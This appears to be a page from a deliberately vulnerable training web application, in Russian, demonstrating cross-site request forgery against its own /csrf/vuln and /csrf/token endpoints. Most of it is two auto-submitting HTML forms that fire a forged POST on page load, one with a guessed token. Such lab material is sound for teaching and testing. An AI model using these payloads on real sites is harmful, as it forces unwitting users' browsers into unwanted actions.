CSRF

Код скрипта на странице /csrf/vuln:

    
        <form id="csrf-form" method="post" action="{{ home_url }}/csrf/vuln">
        </form>
        <script>
            document.addEventListener("DOMContentLoaded", function() {
                document.getElementById("csrf-form").submit();
            });
        </script>

Отправить вредоносный запрос на {{ home_url }}/csrf/vuln

Код скрипта на странице /csrf/token:

    
        <form id="csrf-form" method="post" action="{{ home_url }}/csrf/token">
        <input type="hidden" name="token" value="i-dont-know-csrf-token">
        </form>
        <script>
            document.addEventListener("DOMContentLoaded", function() {
                document.getElementById("csrf-form").submit();
            });
        </script>

Отправить вредоносный запрос на {{ home_url }}/csrf/token
